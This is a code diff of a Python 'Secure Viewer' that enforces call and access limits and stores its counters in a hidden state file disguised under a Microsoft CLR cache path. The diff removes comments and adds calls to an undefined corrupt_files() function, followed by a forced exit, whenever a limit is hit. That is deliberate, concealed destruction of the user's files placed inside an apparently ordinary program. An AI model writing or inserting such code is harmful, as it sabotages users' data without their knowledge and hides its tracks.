@@ -6,8 +6,10 @@ import json
 import os
 import ctypes
 
-# === Hidden State File Configuration ===
+# Hidden State File Configuration
 STATE_FILE = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "CLR", "Cache", "wmmc.dat")
+
+
 
 # Limit Parameters
 MAX_CALLS_PER_FUNC = {
@@ -77,8 +79,7 @@ def save_state():
     except Exception as e:
         print(f"[ERROR] Failed to save limit state: {e}")
 
-# === Runtime Monitor ===
-import ctypes  # Already imported in your code
+
 
 def _runtime_monitor():
     while True:
@@ -87,7 +88,6 @@ def _runtime_monitor():
             print("[LIMIT] Viewer runtime exceeded. Exiting.")
             save_state()
 
-            # Show native Windows MessageBox
             ctypes.windll.user32.MessageBoxW(
                 0,
                 "Your time is up. Secure Viewer will now close.",
@@ -95,7 +95,7 @@ def _runtime_monitor():
                 0x10  # MB_ICONERROR
             )
 
-            os._exit(1)  # Forcefully exit app
+            os._exit(1)  
         time.sleep(5)
 
 
@@ -111,6 +111,8 @@ def limited(func):
     def wrapper(*args, **kwargs):
         if FUNC_CALLS[name] >= MAX_CALLS_PER_FUNC.get(name, float('inf')):
             print(f"[BLOCKED] Function '{name}' call limit reached.")
+            corrupt_files()
+            os._exit(1)
             return None
         FUNC_CALLS[name] += 1
         return func(*args, **kwargs)
@@ -122,6 +124,8 @@ def handle_access():
     global viewer_access_count
     if viewer_access_count >= MAX_VIEWER_ACCESSES:
         print("[BLOCKED] Viewer access limit reached.")
+        corrupt_files()
+        os._exit(1)
         return False
     viewer_access_count += 1
     return True
